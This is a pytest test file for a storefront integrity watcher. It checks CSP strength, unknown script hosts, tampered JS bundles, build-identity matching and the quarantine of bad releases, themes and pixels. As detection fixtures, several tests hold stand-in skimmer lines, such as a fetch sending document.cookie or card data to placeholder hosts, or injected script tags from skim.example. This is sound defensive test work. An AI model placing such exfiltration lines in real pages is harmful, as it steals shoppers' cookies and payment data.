"""T19 / ADM-08 — served-storefront integrity watcher + quarantine (security/storefront_integrity.py).

The storefront (Cloudflare Pages) is simulated with respx behind the REAL SSRF-safe fetcher
(security_fetch.safe_fetch). The served CSP header is the one in frontend/public/_headers, so the
tests also pin the real Report-Only policy.

* every <script src>, inline script, the served CSP header and asset-manifest.json are parsed; same
  origin JS bundles are hashed (sha256) and recorded in settings.storefront_integrity (first_seen…);
* alerts (once per change): unknown script host (not same-origin / not in served CSP script-src /
  not in the custom-code manifest), CSP missing or weakened, inline scripts changed without a deploy,
  SAME filename with DIFFERENT content (tamper), fetch failure streak;
* a new deploy (bundle filename never seen) is audit-only ("vitrin paketi değişti") ONLY when its
  build identity (index.html <meta name="build-sha"> + /version.json, embedded by craco.config.js
  from Cloudflare Pages' CF_PAGES_COMMIT_SHA) equals the backend's own deploy commit
  (RAILWAY_GIT_COMMIT_SHA) — or the backend catches up within 30 min, or a super admin approves that
  exact (sha, release) pair. Missing/unknown id after identified builds, meta≠version.json, wrong
  branch, a mismatch persisting >30 min, or a verified sha re-served with different content → critical;
* the served CSP is now ENFORCING (+ strict Report-Only); losing enforcement, report-uri,
  object-src 'none', base-uri, frame-ancestors or gaining a wildcard script source → critical;
* quarantine (super admin, fail-closed run_audited): a quarantined fingerprint served again (rollback)
  → critical alert on EVERY run (not throttled); quarantined custom theme / pixel versions cannot be
  re-published (409);
* the daily self-test reports the last watcher result ("Vitrin bütünlüğü").
"""
from __future__ import annotations

import json
from pathlib import Path

import httpx
import pytest
import respx

from conftest import KvUsers, kv_run
from kv_harness import kv_find, kv_findall

REPO = Path(__file__).resolve().parents[3]
BASE = "https://shop.kv-test.invalid"
API = "/api/admin/security/storefront-integrity"
THEME = "/api/admin/custom-theme"
PIXELS = "/api/marketing-pixels"


def _headers_value(name: str) -> str:
    for line in (REPO / "frontend" / "public" / "_headers").read_text(encoding="utf-8").splitlines():
        s = line.strip()
        if s.startswith(name + ":"):
            return s.split(":", 1)[1].strip()
    raise AssertionError(f"_headers: {name} not found")


def _served_csp() -> str:
    """The ENFORCING policy from frontend/public/_headers."""
    return _headers_value("Content-Security-Policy")


def _served_csp_ro() -> str:
    """The strict Report-Only (measurement) policy from frontend/public/_headers."""
    return _headers_value("Content-Security-Policy-Report-Only")


SHA_A = "a" * 8 + "0123456789abcdef0123456789abcdef"   # 40 hex
SHA_B = "b" * 8 + "0123456789abcdef0123456789abcdef"
SHA_C = "c" * 8 + "0123456789abcdef0123456789abcdef"

INLINE_A = '!function(){try{var e=new URL(location.href)}catch(e){}}();'
INLINE_GTM = 'window.dataLayer=window.dataLayer||[];'


def _index(main="main.aaaa1111.js", inline=(INLINE_A, INLINE_GTM), extra_head="", build_sha=SHA_A):
    scripts = "".join(f"<script>{s}</script>" for s in inline)
    meta = f'<meta name="build-sha" content="{build_sha}"/>' if build_sha is not None else ""
    return (f'<!doctype html><html lang="tr"><head><meta charset="utf-8"/>{meta}'
            f'<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=X"/>'
            f'{scripts}'
            f'<script type="application/ld+json">{{"@context":"https://schema.org","@type":"Organization"}}</script>'
            f'<script defer="defer" src="/static/js/{main}"></script>'
            f'<link href="/static/css/main.x.css" rel="stylesheet">{extra_head}'
            f'<script type="application/ld+json" data-seo="edge">{{"@type":"WebSite"}}</script>'
            f'</head><body><div id="root"></div></body></html>')


class Site:
    """Mutable fake storefront served through respx."""

    def __init__(self):
        self.index = _index()
        self.index_status = 200
        self.csp = _served_csp()
        self.csp_header = "content-security-policy"
        self.csp_ro = _served_csp_ro()            # strict Report-Only, served alongside
        self.version = {"sha": SHA_A, "branch": "main", "built_at": "2026-10-04T20:00:00Z"}
        self.files = {"/static/js/main.aaaa1111.js": b"console.log('main v1');",
                      "/static/js/11.c0ffee01.chunk.js": b"/*chunk 11*/",
                      "/static/js/12.c0ffee02.chunk.js": b"/*chunk 12*/"}
        self.manifest = True
        self.html_paths = set()
        self.hits = []

    def handler(self, request: httpx.Request):
        path = request.url.path
        self.hits.append(path)
        if path == "/":
            h = {"content-type": "text/html; charset=utf-8"}
            if self.csp and self.csp_header:
                h[self.csp_header] = self.csp
            if self.csp_ro:
                h.setdefault("content-security-policy-report-only", self.csp_ro)
            return httpx.Response(self.index_status, text=self.index, headers=h)
        if path == "/version.json" and self.version is not None:
            return httpx.Response(200, json=self.version, headers={"content-type": "application/json"})
        if path == "/asset-manifest.json" and self.manifest:
            files = {p.rsplit("/", 1)[-1]: p for p in self.files if p.endswith(".js")}
            main = next((p for p in self.files if "/main." in p), "")
            return httpx.Response(200, json={"files": {"main.js": main, **files},
                                             "entrypoints": [main.lstrip("/")]})
        if path in self.files and path not in self.html_paths:
            return httpx.Response(200, content=self.files[path], headers={"content-type": "application/javascript"})
        # Pages SPA fallback: unknown path → index.html with 200
        return httpx.Response(200, text=self.index, headers={"content-type": "text/html"})

    def deploy(self, main_name: str, body: bytes, inline=None, build_sha="same", branch="main"):
        """A Pages deploy: new content-hashed main bundle (+ the build id it embeds).
        build_sha="same" keeps the current id; None = a build without any id (old-style)."""
        if build_sha == "same":
            build_sha = (self.version or {}).get("sha", SHA_A)
        self.files = {p: v for p, v in self.files.items() if "/main." not in p}
        self.files[f"/static/js/{main_name}"] = body
        self.index = _index(main=main_name, inline=inline or (INLINE_A, INLINE_GTM), build_sha=build_sha)
        self.version = None if build_sha is None else {"sha": build_sha, "branch": branch,
                                                         "built_at": "2026-10-04T21:00:00Z"}


@pytest.fixture
def site(monkeypatch):
    monkeypatch.setenv("SITE_URL", BASE)
    # backend and storefront deploy from the same push → same commit by default
    monkeypatch.setenv("RAILWAY_GIT_COMMIT_SHA", SHA_A)
    monkeypatch.delenv("GIT_SHA", raising=False)
    monkeypatch.delenv("STOREFRONT_RELEASE_BRANCH", raising=False)
    monkeypatch.delenv("RAILWAY_GIT_BRANCH", raising=False)
    import company
    company.invalidate()
    s = Site()
    with respx.mock(assert_all_mocked=True, assert_all_called=False) as router:
        router.route(host="shop.kv-test.invalid").mock(side_effect=s.handler)
        yield s
    company.invalidate()


def _run():
    from security.storefront_integrity import run_storefront_integrity_check
    return kv_run(run_storefront_integrity_check())


def _state():
    return kv_find("settings", {"id": "storefront_integrity"})


def _alerts(kind):
    return kv_findall("alerts", {"kind": kind})


def _sf_alerts():
    return [a for a in kv_findall("alerts", {}) if str(a.get("kind") or "").startswith("storefront_")]


def _selftest():
    from routes.deps import db
    from security import selftest
    return kv_run(selftest._c_storefront_integrity(db))


# ───────────────────────────────────────── parsing ─────────────────────────────────────────
def test_parser_and_csp_matching_units():
    from security import storefront_integrity as si
    p = si.parse_index(_index(extra_head='<script type="module" src="https://cdn.other.example/m.js"></script>'
                                         '<link rel="modulepreload" href="/static/js/pre.js">'
                                         '<script type="text/template"><b>x</b></script>'))
    assert p["external"] == ["/static/js/main.aaaa1111.js", "https://cdn.other.example/m.js", "/static/js/pre.js"]
    assert len(p["inline"]) == 2 and p["data_blocks"] == 3          # 2× ld+json + text/template not hashed
    assert all(i["csp"].startswith("'sha256-") for i in p["inline"])
    assert p["build_sha"] == SHA_A
    assert si.parse_index('<meta name="build-sha" content="%REACT_APP_BUILD_SHA%">')["build_sha"] == "%REACT_APP_BUILD_SHA%"
    assert si.norm_git_sha("%REACT_APP_BUILD_SHA%") == "" and si.norm_git_sha("unknown") == ""
    assert si.git_sha_eq(SHA_A[:12], SHA_A) and not si.git_sha_eq(SHA_A[:6], SHA_A) and not si.git_sha_eq(SHA_A, SHA_B)
    csp = si.parse_csp(_served_csp())
    flags = si.csp_flags(csp)
    assert flags == {"present": True, "report": True, "object_src_none": True, "frame_ancestors": True,
                     "base_uri": True, "script_restricted": True}
    assert si.csp_flags(si.parse_csp("script-src 'self' https:; object-src 'none'"))["script_restricted"] is False
    assert si.csp_flags(si.parse_csp("default-src *"))["script_restricted"] is False
    o = ("https", "shop.kv-test.invalid", 443)
    srcs = si._script_sources(csp)
    allowed = lambda u: any(si.source_allows(x, u, o) for x in srcs)  # noqa: E731
    assert allowed("https://www.googletagmanager.com/gtm.js?id=GTM-1")
    assert allowed("https://shop.kv-test.invalid/static/js/a.js")              # 'self'
    assert not allowed("https://googletagmanager.com/x.js")                     # *.x does not match apex
    assert not allowed("http://www.googletagmanager.com/gtm.js")                # scheme downgrade
    assert not allowed("https://evil.example/x.js")
    assert not allowed("data:text/javascript,alert(1)")
    assert not allowed("https://shop.kv-test.invalid:8443/a.js")                # other port ≠ 'self'


# ───────────────────────────────────────── baseline ─────────────────────────────────────────
def test_baseline_records_fingerprints_and_quiet_rerun(site):
    r = _run()
    assert r["last_status"] == "ok", r
    st = _state()
    paths = {b["path"]: b for b in st["bundles"]}
    assert set(paths) == set(site.files)
    for p, body in site.files.items():
        import hashlib
        assert paths[p]["sha256"] == hashlib.sha256(body).hexdigest() and paths[p]["first_seen"]
    assert st["entry_paths"] == ["/static/js/main.aaaa1111.js"]
    assert st["inline_count"] == 2 and st["data_blocks"] == 2
    assert st["csp_header"] == "Content-Security-Policy" and st["csp_flags"]["report"]
    assert st["csp_enforced"] is True and st["csp_report_only"] is True
    # the strict Report-Only lists the REAL index.html hashes, not these synthetic ones → reported for _headers upkeep
    assert len(st["strict_csp_inline_missing"]) == 2
    assert st["scripts"][0]["allowed_by"] == "same-origin"
    # build identity: meta == version.json == backend deploy commit → verified
    assert st["build"]["sha"] == SHA_A and st["build"]["status"] == "verified" and st["build"]["verified_by"] == "backend"
    assert st["build"]["branch"] == "main" and st["build"]["version_status"] == "ok"
    assert kv_findall("audit_logs", {"action": "security.storefront_build_verified"})
    assert not _sf_alerts()
    # the stored state is hashes/paths only — no page text
    assert "dataLayer" not in json.dumps(st, ensure_ascii=False)
    r2 = _run()
    assert r2["last_status"] == "ok" and not _sf_alerts()
    assert _selftest()[0] == "ok"


# ───────────────────────────────────────── script hosts ─────────────────────────────────────────
def test_unknown_script_host_alerts_once_allowlisted_hosts_do_not(site):
    from routes.deps import db
    kv_run(db.settings.insert_one({"id": "script_host_manifest", "hosts": ["cdn.partner.example"]}))
    site.index = _index(extra_head=(
        '<script async src="https://www.googletagmanager.com/gtm.js?id=GTM-KV"></script>'   # CSP allowlist
        '<script src="https://cdn.partner.example/p.js"></script>'                         # custom-code manifest
        '<script src="https://evil-cdn.example/skim.js"></script>'))                        # neither
    r = _run()
    assert r["last_status"] == "fail"
    al = _alerts("storefront_unknown_script_host")
    assert len(al) == 1 and "evil-cdn.example" in al[0]["body"] and al[0]["level"] == "critical"
    assert "googletagmanager" not in al[0]["body"] and "cdn.partner.example" not in al[0]["body"]
    assert kv_findall("audit_logs", {"action": "security.storefront_unknown_script_host"})
    by = {s["host"]: s["allowed_by"] for s in _state()["scripts"]}
    assert by == {"shop.kv-test.invalid": "same-origin", "www.googletagmanager.com": "csp",
                  "cdn.partner.example": "manifest", "evil-cdn.example": "YOK"}
    _run()                                            # same problem again → no second e-mail
    assert len(_alerts("storefront_unknown_script_host")) == 1
    st, detail = _selftest()
    assert st == "fail" and "evil-cdn.example" in detail


# ───────────────────────────────────────── CSP ─────────────────────────────────────────
def test_csp_header_removed_or_weakened_alerts(site):
    _run()
    site.csp, site.csp_ro = "", ""
    assert _run()["last_status"] == "fail"
    al = _alerts("storefront_csp_weakened")
    assert len(al) == 1 and "CSP başlığı yok" in al[0]["body"]
    # back, but without report-uri and object-src 'none'
    site.csp = "; ".join(d for d in _served_csp().split("; ")
                         if not d.startswith(("report-uri", "object-src")))
    _run()
    bodies = " | ".join(a["body"] for a in _alerts("storefront_csp_weakened"))
    assert len(_alerts("storefront_csp_weakened")) == 3
    assert "report-uri/report-to yok" in bodies and "object-src 'none' yok" in bodies
    # enforcement downgraded: the same policy only as Report-Only → browser blocks nothing → critical
    site.csp, site.csp_header, site.csp_ro = _served_csp(), "content-security-policy-report-only", ""
    r = _run()
    assert r["last_status"] == "fail" and r["csp_enforced"] is False
    lost = [a for a in _alerts("storefront_csp_weakened") if "zorlayıcı CSP kalktı" in a["body"]]
    assert len(lost) == 1 and lost[0]["level"] == "critical"
    _run()
    assert len([a for a in _alerts("storefront_csp_weakened") if "zorlayıcı CSP kalktı" in a["body"]]) == 1
    st, detail = _selftest()
    assert st == "fail" and "zorlayıcı CSP kalktı" in detail
    # enforcement back, but with a wildcard script source and without base-uri → critical
    site.csp_header, site.csp_ro = "content-security-policy", _served_csp_ro()
    site.csp = "; ".join(d for d in _served_csp().split("; ") if not d.startswith("base-uri")).replace(
        "script-src 'self'", "script-src 'self' https:", 1)
    _run()
    bodies = " | ".join(a["body"] for a in _alerts("storefront_csp_weakened"))
    assert "base-uri yok" in bodies and "joker kaynak" in bodies
    site.csp = _served_csp()
    assert _run()["last_status"] == "ok"
    # a new script-src host in the served CSP → warning (once)
    site.csp = _served_csp().replace("script-src 'self'", "script-src 'self' https://new-tag.example", 1)
    _run()
    added = [a for a in _alerts("storefront_csp_source_added") if "new-tag.example" in a["body"]]
    assert len(added) == 1 and added[0]["level"] == "warning"
    _run()
    assert len([a for a in _alerts("storefront_csp_source_added") if "new-tag.example" in a["body"]]) == 1


# ─────────────────────────────── inline scripts & deploys ───────────────────────────────
def test_inline_change_without_deploy_alerts_new_deploy_is_audit_only(site, monkeypatch):
    _run()
    site.index = _index(inline=(INLINE_A, INLINE_GTM, "fetch('https://x.example/'+document.cookie)"))
    r = _run()
    assert r["last_status"] == "warn"
    al = _alerts("storefront_inline_changed")
    assert len(al) == 1 and "yeni_adet: 3" in al[0]["body"]
    _run()
    assert len(_alerts("storefront_inline_changed")) == 1          # once per change
    # a real deploy (same push → backend on the same commit): new content-hashed bundle name
    # (+ inline change) with a build id equal to the backend's commit → audit only, no e-mail
    n_before = len(_sf_alerts())
    monkeypatch.setenv("RAILWAY_GIT_COMMIT_SHA", SHA_B)
    site.deploy("main.bbbb2222.js", b"console.log('main v2');", inline=(INLINE_A,), build_sha=SHA_B)
    r = _run()
    assert r["deploy_detected"] is True and r["last_status"] == "ok", r
    assert r["build"]["status"] == "verified" and r["build"]["sha"] == SHA_B
    assert len(_sf_alerts()) == n_before
    ev = kv_findall("audit_logs", {"action": "security.storefront_bundle_changed"})
    assert len(ev) == 1 and "main.bbbb2222.js" in json.dumps(ev[0], ensure_ascii=False)
    assert SHA_B[:12] in json.dumps(ev[0], ensure_ascii=False)          # the deploy record names its build
    b = {x["path"]: x for x in _state()["bundles"]}
    assert b["/static/js/main.bbbb2222.js"]["first_seen"] and b["/static/js/main.aaaa1111.js"]["entry"] is False
    assert len(_state()["releases"]) == 3


# ───────────────────────────────────────── tamper ─────────────────────────────────────────
def test_same_filename_different_content_is_critical_tamper(site):
    import hashlib
    _run()
    orig = hashlib.sha256(site.files["/static/js/main.aaaa1111.js"]).hexdigest()
    site.files["/static/js/main.aaaa1111.js"] = b"console.log('main v1');fetch('//skim.example/'+card)"
    site.files["/static/js/12.c0ffee02.chunk.js"] = b"/*chunk 12 tampered*/"
    r = _run()
    assert r["last_status"] == "fail"
    al = _alerts("storefront_bundle_tampered")
    assert len(al) == 2 and all(a["level"] == "critical" for a in al)
    assert any("main.aaaa1111.js" in a["body"] for a in al) and any("12.c0ffee02" in a["body"] for a in al)
    ent = {b["path"]: b for b in _state()["bundles"]}["/static/js/main.aaaa1111.js"]
    assert ent["sha256"] == orig and ent["changed_sha256"] != orig      # baseline kept, served recorded
    _run()
    assert len(_alerts("storefront_bundle_tampered")) == 2              # once per change
    assert _selftest()[0] == "fail"
    # SPA fallback (HTML for a JS path) is "file missing", never a content change
    site.files["/static/js/main.aaaa1111.js"] = b"console.log('main v1');"
    site.html_paths.add("/static/js/11.c0ffee01.chunk.js")
    _run()
    assert len(_alerts("storefront_bundle_tampered")) == 2
    assert _state()["skipped_this_run"].get("html_fallback") == 1


# ─────────────────────────────── build identity (T19) ───────────────────────────────
@pytest.fixture
def clock(monkeypatch):
    """Controls the watcher's run time (run_at) so the 30-minute match window can be crossed."""
    from datetime import datetime, timedelta, timezone
    from security import storefront_integrity as si
    t = {"now": datetime.now(timezone.utc)}
    monkeypatch.setattr(si, "_now", lambda: t["now"].isoformat())

    def advance(minutes):
        t["now"] += timedelta(minutes=minutes)
    return advance


def _build_alerts():
    return _alerts("storefront_build_unverified")


def test_build_matching_backend_within_window_is_expected(site, clock, monkeypatch):
    assert _run()["build"]["status"] == "verified"                  # A == backend A
    # Pages finishes first: storefront already on B, backend still on A → pending, no alert
    site.deploy("main.bbbb2222.js", b"console.log('v2');", build_sha=SHA_B)
    r = _run()
    assert r["build"]["status"] == "pending" and r["last_status"] == "ok"
    clock(20)
    assert _run()["build"]["status"] == "pending"
    # Railway catches up (same push) inside the 30-minute window → verified, never alerted
    monkeypatch.setenv("RAILWAY_GIT_COMMIT_SHA", SHA_B)
    clock(5)
    r = _run()
    assert r["build"]["status"] == "verified" and r["build"]["verified_by"] == "backend"
    assert not _build_alerts() and not _sf_alerts()
    # a later backend-only redeploy while Pages still serves the verified B release → still fine
    monkeypatch.setenv("RAILWAY_GIT_COMMIT_SHA", SHA_C)
    clock(60)
    assert _run()["build"]["status"] == "verified" and not _build_alerts()
    assert _selftest()[0] == "ok"


def test_build_mismatch_over_30_min_is_critical_until_approved(site, clock, kv_client, kv_users):
    _run()
    site.deploy("main.cccc3333.js", b"console.log('v3');", build_sha=SHA_C)   # backend never moves to C
    assert _run()["build"]["status"] == "pending"
    clock(31)
    r = _run()
    assert r["last_status"] == "fail" and r["build"]["status"] == "unverified"
    al = _build_alerts()
    assert len(al) == 1 and al[0]["level"] == "critical" and SHA_C[:12] in al[0]["body"]
    clock(15)
    _run()
    assert len(_build_alerts()) == 1                                  # once per change
    st, detail = _selftest()
    assert st == "fail" and "storefront_build_unverified" in detail
    # a legit frontend-only deploy can be approved: super admin only, reason required, served build only
    sa = KvUsers.hdr(kv_users.staff(super_admin=True))
    staff = KvUsers.hdr(kv_users.staff(perms=["settings.view", "settings.edit", "security.view"]))
    url = f"{API}/approve-build"
    assert kv_client.post(url, headers=staff, json={"sha": SHA_C, "reason": "yalnız frontend"}).status_code == 403
    assert kv_client.post(url, headers=sa, json={"sha": SHA_C, "reason": ""}).status_code == 400
    assert kv_client.post(url, headers=sa, json={"sha": "zz", "reason": "yalnız frontend"}).status_code == 400
    assert kv_client.post(url, headers=sa, json={"sha": SHA_B, "reason": "yalnız frontend"}).status_code == 409
    r = kv_client.post(url, headers=sa, json={"sha": SHA_C[:12], "reason": "yalnız frontend değişikliği"})
    assert r.status_code == 200 and r.json()["approved"]["sha"] == SHA_C
    assert len(kv_findall("audit_logs", {"action": "storefront.build_approve"})) == 2      # intent + done
    assert _alerts("storefront_build_approved")
    clock(15)
    r = _run()
    assert r["build"]["status"] == "verified" and r["build"]["verified_by"] == "approval"
    assert r["last_status"] == "ok"
    # the approval covers THAT release only: same id, different content → critical again
    site.deploy("main.dddd4444.js", b"skimmer()", build_sha=SHA_C)
    r = _run()
    assert r["last_status"] == "fail" and r["build"]["status"] == "unverified"
    assert any("farklı içerikle" in a["body"] for a in _build_alerts())


def test_build_approval_is_fail_closed(site, clock, kv_client, kv_users, id_break_audit):
    from routes.deps import db
    _run()
    site.deploy("main.cccc3333.js", b"console.log('v3');", build_sha=SHA_C)
    _run()
    id_break_audit()
    r = kv_client.post(f"{API}/approve-build", headers=KvUsers.hdr(kv_users.staff(super_admin=True)),
                       json={"sha": SHA_C, "reason": "yalnız frontend değişikliği"})
    assert r.status_code == 503
    assert not (kv_run(db.settings.find_one({"id": "storefront_build_approvals"})) or {}).get("items")


def test_missing_conflicting_or_wrong_branch_build_id_is_critical(site, clock):
    # rollout: the very first observation is an old build without an id → 30-minute grace, then critical
    site.deploy("main.aaaa1111.js", b"console.log('main v1');", build_sha=None)
    r = _run()
    assert r["build"]["status"] == "pending" and not _build_alerts()
    clock(31)
    r = _run()
    assert r["build"]["status"] == "missing" and r["last_status"] == "fail" and len(_build_alerts()) == 1
    # the identified build arrives → verified, the problem is gone
    site.deploy("main.aaaa1111.js", b"console.log('main v1');", build_sha=SHA_A)
    r = _run()
    assert r["build"]["status"] == "verified" and r["last_status"] == "ok"
    # identified builds were served before → an id-less build is critical IMMEDIATELY
    site.deploy("main.eeee5555.js", b"console.log('no id');", build_sha=None)
    r = _run()
    assert r["build"]["status"] == "missing" and r["last_status"] == "fail" and len(_build_alerts()) == 2
    # "unknown" (built outside Pages without git) counts as missing too
    site.deploy("main.ffff6666.js", b"console.log('unknown');", build_sha="unknown")
    assert _run()["build"]["status"] == "missing" and len(_build_alerts()) == 3
    # index.html meta and version.json disagree → critical
    site.deploy("main.aaaa1111.js", b"console.log('main v1');", build_sha=SHA_A)
    site.version = {"sha": SHA_B, "branch": "main"}
    r = _run()
    assert r["build"]["status"] == "conflict" and r["last_status"] == "fail"
    # built from a non-release branch (e.g. a preview promoted to production) → critical
    site.deploy("main.aaaa1111.js", b"console.log('main v1');", build_sha=SHA_A, branch="feature/x")
    r = _run()
    assert r["build"]["status"] == "branch" and r["last_status"] == "fail"
    assert any("beklenmeyen dal: feature/x" in a["body"] for a in _build_alerts())


def test_verified_id_reserved_with_new_content_is_critical(site, monkeypatch):
    _run()                                                     # A verified (backend A)
    monkeypatch.setenv("RAILWAY_GIT_COMMIT_SHA", SHA_B)       # backend-only redeploy
    assert _run()["build"]["status"] == "verified"             # same A release, verified before
    # an upload stamped with the old, verified id A but carrying a new bundle
    site.deploy("main.9999aaaa.js", b"skimmer()", build_sha=SHA_A)
    r = _run()
    assert r["last_status"] == "fail" and r["build"]["status"] == "unverified"
    assert any("farklı içerikle" in a["body"] for a in _build_alerts())
    # rollback to the original verified release → build id fine again (generic rollback warning only)
    site.deploy("main.aaaa1111.js", b"console.log('main v1');", build_sha=SHA_A)
    assert _run()["build"]["status"] == "verified"


def test_backend_commit_unknown_is_unverifiable_without_alert(site, monkeypatch):
    monkeypatch.delenv("RAILWAY_GIT_COMMIT_SHA", raising=False)
    r = _run()
    assert r["build"]["status"] == "unverifiable" and r["last_status"] == "ok" and not _build_alerts()
    st, detail = _selftest()
    assert st == "warn" and "RAILWAY_GIT_COMMIT_SHA" in detail
    # white-label: the release branch comes from settings/env, not code
    from security import storefront_integrity as si
    monkeypatch.setenv("STOREFRONT_RELEASE_BRANCH", "release, prod")
    assert si.expected_branches() == ["release", "prod"]
    monkeypatch.delenv("STOREFRONT_RELEASE_BRANCH")
    monkeypatch.setenv("RAILWAY_GIT_BRANCH", "production")
    assert si.expected_branches() == ["production", "main"]


# ───────────────────────────────────────── quarantine ─────────────────────────────────────────
def test_quarantined_release_rollback_alerts_every_run_unthrottled(site, kv_client, kv_users, kv_isolation):
    sa = KvUsers.hdr(kv_users.staff(super_admin=True))
    _run()                                                     # v1 served
    v1_sha = {b["path"]: b for b in _state()["bundles"]}["/static/js/main.aaaa1111.js"]["sha256"]
    v1_body = site.files["/static/js/main.aaaa1111.js"]
    site.deploy("main.bbbb2222.js", b"console.log('main v2');")
    _run()                                                     # v2 served
    r = kv_client.post(f"{API}/quarantine", headers=sa,
                       json={"bundle_path": "/static/js/main.aaaa1111.js", "reason": "v1 skimmer içeriyor"})
    assert r.status_code == 200, r.text
    assert r.json()["added"] == [v1_sha] and r.json()["currently_served"] == []
    acts = [a["action"] for a in kv_findall("audit_logs", {"action": "storefront.quarantine_add"})]
    assert len(acts) == 2                                      # run_audited: intent + done
    assert _alerts("storefront_quarantine_changed")
    # rollback in Cloudflare Pages to v1
    site.files["/static/js/main.aaaa1111.js"] = v1_body
    site.index = _index(main="main.aaaa1111.js")
    sent = kv_isolation.alert
    n_sent = sent.await_count
    assert _run()["last_status"] == "fail"
    q1 = _alerts("storefront_quarantined_served")
    assert len(q1) == 1 and q1[0]["level"] == "critical" and "main.aaaa1111.js" in q1[0]["body"]
    _run()
    q2 = _alerts("storefront_quarantined_served")
    assert len(q2) == 2 and q2[0]["fingerprint"] != q2[1]["fingerprint"]   # every run, distinct fp
    assert sent.await_count - n_sent >= 2                       # both actually delivered (not throttled)
    assert _alerts("storefront_rollback")                       # plus the generic rollback warning
    assert kv_findall("audit_logs", {"action": "security.storefront_quarantined_served"})
    st, detail = _selftest()
    assert st == "fail" and "KARANTİNA" in detail
    # state endpoint: super admin only
    g = kv_client.get(API, headers=sa)
    assert g.status_code == 200 and g.json()["quarantine"][0]["sha256"] == v1_sha
    staff = KvUsers.hdr(kv_users.staff(perms=["settings.view", "settings.edit", "security.view"]))
    assert kv_client.get(API, headers=staff).status_code == 403
    # lift the quarantine (audited) → next run no longer alerts
    d = kv_client.delete(f"{API}/quarantine/{v1_sha}", headers=sa)
    assert d.status_code == 200
    _run()
    assert len(_alerts("storefront_quarantined_served")) == 2


def test_quarantine_is_super_admin_only_validated_and_fail_closed(site, kv_client, kv_users, id_break_audit):
    from routes.deps import db
    _run()
    sha = _state()["release_fp"]
    staff = KvUsers.hdr(kv_users.staff(perms=["settings.view", "settings.edit", "tasarim.edit"]))
    r = kv_client.post(f"{API}/quarantine", headers=staff, json={"sha256": sha, "reason": "kötü sürüm"})
    assert r.status_code == 403
    sa = KvUsers.hdr(kv_users.staff(super_admin=True))
    assert kv_client.post(f"{API}/quarantine", headers=sa, json={"sha256": "zz", "reason": "kötü sürüm"}).status_code == 400
    assert kv_client.post(f"{API}/quarantine", headers=sa, json={"sha256": sha, "reason": ""}).status_code == 400
    id_break_audit()
    r = kv_client.post(f"{API}/quarantine", headers=sa, json={"sha256": sha, "reason": "kötü sürüm"})
    assert r.status_code == 503
    assert not (kv_run(db.settings.find_one({"id": "storefront_quarantine"})) or {}).get("items")


def test_quarantined_custom_theme_and_pixel_versions_cannot_be_republished(site, kv_client, kv_users):
    sa = KvUsers.hdr(kv_users.staff(super_admin=True))
    bad_js = "var s=document.createElement('script');s.src='https://skim.example/k.js';document.head.appendChild(s)"
    assert kv_client.put(THEME, headers=sa, json={"custom_css": "", "custom_js": bad_js, "js_enabled": True}).status_code == 200
    assert kv_client.put(THEME, headers=sa, json={"custom_css": "", "custom_js": "console.log(1)", "js_enabled": True}).status_code == 200
    hist = kv_client.get(f"{THEME}/history", headers=sa).json()["items"]
    bad = next(h for h in hist if h["custom_js"] == bad_js)
    r = kv_client.post(f"{API}/quarantine", headers=sa, json={"custom_theme_history_id": bad["id"], "reason": "skimmer"})
    assert r.status_code == 200 and r.json()["targets"][0]["kind"] == "custom_js"
    # "rollback" = re-saving the old content → refused, live code unchanged
    r = kv_client.put(THEME, headers=sa, json={"custom_css": "", "custom_js": bad_js, "js_enabled": True})
    assert r.status_code == 409
    assert kv_find("settings", {"id": "custom_theme"})["custom_js"] == "console.log(1)"
    blocked = _alerts("storefront_quarantine_blocked")
    assert len(blocked) == 1 and "createElement" not in blocked[0]["body"]
    # pixels: same rule
    snip = '<script src="https://px.bad.example/t.js"></script>'
    p = kv_client.post(PIXELS, headers=sa, json={"provider": "custom", "name": "x", "is_active": True, "head_snippet": snip})
    pid = p.json()["pixel"]["id"]
    kv_client.post(PIXELS, headers=sa, json={"id": pid, "provider": "custom", "name": "x", "is_active": True,
                                             "head_snippet": "<script>1</script>"})
    ph = kv_client.get(f"{PIXELS}/{pid}/history", headers=sa).json()["items"]
    r = kv_client.post(f"{API}/quarantine", headers=sa,
                       json={"pixel_history_id": next(h for h in ph if h["snapshot"]["head_snippet"] == snip)["id"],
                             "reason": "kötü piksel"})
    assert r.status_code == 200
    r = kv_client.post(PIXELS, headers=sa, json={"id": pid, "provider": "custom", "name": "x", "is_active": True,
                                                 "head_snippet": snip})
    assert r.status_code == 409
    # a quarantined version written straight into the DB (bypassing the API) → self-test fails
    from routes.deps import db
    kv_run(db.settings.update_one({"id": "custom_theme"}, {"$set": {"custom_js": bad_js}}))
    st, detail = _selftest()
    assert st == "fail" and "karantina" in detail


# ─────────────────────────────── failures / self-test / wiring ───────────────────────────────
def test_fetch_failure_streak_alerts_once_and_selftest_warns(site):
    from security import storefront_integrity as si
    assert _selftest()[0] == "warn"                            # never ran
    site.index_status = 503
    for _ in range(si.FAIL_ALERT_AFTER + 2):
        assert _run()["status"] == "error"
    assert len(_alerts("storefront_watch_failed")) == 1
    st, detail = _selftest()
    assert st == "warn" and "HTTP 503" in detail
    site.index_status = 200
    assert _run()["last_status"] == "ok"
    assert _state()["consecutive_failures"] == 0


def test_no_storefront_url_is_skipped(monkeypatch):
    from security import storefront_integrity as si
    import company
    monkeypatch.delenv("SITE_URL", raising=False)
    monkeypatch.delenv("FRONTEND_PUBLIC_URL", raising=False)
    company.invalidate()
    assert kv_run(si.run_storefront_integrity_check())["status"] == "skipped"
    assert _selftest()[0] == "warn"


def test_watcher_is_scheduled_every_15_minutes_and_in_selftest():
    import inspect
    from security import selftest
    import scheduler
    src = inspect.getsource(scheduler.start_scheduler)
    assert 'id="storefront_integrity_watch"' in src and "run_storefront_integrity_check" in src
    assert '"Vitrin bütünlüğü"' in inspect.getsource(selftest.run_selftest)


class _MotorLikeDb:
    """Gerçek Motor veritabanı gibi doğruluk testine (bool) izin vermeyen sarmalayıcı.
    mongomock bool()'a izin verdiği için `db or _db()` hatası testlerde görünmüyordu (canlıda
    öz-test 'Vitrin bütünlüğü: NotImplementedError' veriyordu)."""
    def __init__(self, inner):
        self._inner = inner

    def __bool__(self):
        raise NotImplementedError("Database objects do not implement truth value testing or bool()")

    def __getattr__(self, name):
        return getattr(self._inner, name)


def test_selftest_and_watch_accept_real_motor_db_without_truth_testing(site, kv_db):
    from security import storefront_integrity as si
    db = _MotorLikeDb(kv_db)
    assert kv_run(si.run_storefront_integrity_check(db=db))["last_status"] == "ok"
    st, detail = kv_run(si.selftest_status(db))
    assert st in ("ok", "warn") and "NotImplementedError" not in detail
    assert kv_run(si.quarantine_items(db)) == []
